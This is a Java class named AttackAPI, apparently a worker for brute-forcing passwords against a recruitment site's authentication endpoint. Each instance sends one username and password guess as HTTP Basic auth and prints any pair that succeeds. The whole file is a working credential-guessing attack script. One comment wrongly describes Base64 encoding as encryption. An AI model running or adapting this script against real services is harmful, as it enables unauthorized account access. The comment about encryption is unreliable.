import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.Base64;

public class AttackAPI implements Runnable{

    private String username;    
    private String password;

    public AttackAPI(String password){ 
        /* AttackAPI constructor. */
        username = "John";
        this.password = password;
    }
    
    public void run(){

        /* Method to lauch attacks on the API. */

        String authenticator = username +":"+ password;
        String encodedAuthenticator = Base64.getEncoder().encodeToString(authenticator.getBytes()); // Base64 encrypting the attack credentials. 

        HttpClient myClient = HttpClient.newHttpClient();   //  Creating HttpClient object.

        HttpRequest myRequest = HttpRequest.newBuilder()
            .uri(URI.create("http://recruitment.warpdevelopment.co.za/api/v2/authenticate"))
            .header("Authorization", "Basic " + encodedAuthenticator)
            .GET()
            .build();   //  Creating HttpRequest object.

        HttpResponse<String> myResponse;

        try{
            myResponse = myClient.send(myRequest, HttpResponse.BodyHandlers.ofString());
        }

        catch (Exception e){
            myResponse = null;
            System.out.println(e);
            System.exit(0);
        }   /* Attempt to call the API with the respective credentials. */

        if (myResponse.statusCode() == 200){
            System.out.println("\nCorrect credentials are, \nUsername:" + username + "\nPassword:" + password);
            System.out.println("Response: " + myResponse.body());
        }   /* Filters only for the successfully authenticated credentials. */

    }

}
